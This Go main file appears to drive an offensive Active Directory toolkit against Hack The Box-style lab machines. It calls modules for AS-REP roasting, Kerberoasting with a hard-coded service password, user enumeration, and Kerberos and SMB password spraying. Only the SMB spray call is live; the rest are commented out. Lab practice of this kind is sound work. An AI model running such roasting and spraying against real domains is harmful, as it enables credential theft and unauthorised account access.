package main

import "divine-dragon/remote_exploit"

func main() {
	// asrep_module := remote_exploit.NewASREPRoastingModule("egotistical-bank.local", "10.129.95.180", false, false, false, "", "remote_exploit/names.txt", "", 50, 0)
	// asrep_module.Run()

	// kerberos_enum_module := remote_enum.NewKerberosEnumUsersModule("support.htb", "10.129.86.142", false, true, false, "remote_exploit/names.txt", "", 10, 0)
	// kerberos_enum_module.Run()
	// ldap_enum_module := remote_enum.NewLdapEnumModule("egotistical-bank.local", "10.129.95.180", "389", "", "", "", true, "")
	// ldap_enum_module.Run()

	// kerberoasting_module := remote_exploit.NewKerberoastingModule("active.htb", "10.129.95.180", "SVC_TGS", "GPPstillStandingStrong2k18", false, false, "", true, "")
	// kerberoasting_module.Run()

	// smb_enum_module := remote_enum.NewSmbModuleNewLdapEnumModule("support.htb", "10.129.86.142", "445", "guest", "", "", true, "")
	// smb_enum_module.Run()

	// kerberosPasswordSprayingModule := remote_exploit.NewKerberosSprayingModule("intelligence.htb", "10.129.95.154", false, false, false, "remote_exploit/names.txt", "NewIntelligenceCorpUser9876", "", 50, 0)
	// kerberosPasswordSprayingModule.Run()

	smbPasswordSprayModule := remote_exploit.NewSmbSprayModule("intelligence.htb", "10.129.95.154", "445", "remote_exploit/names.txt", "NewIntelligenceCorpUser9876", false, "", 50, 0)
	smbPasswordSprayModule.Run()
}
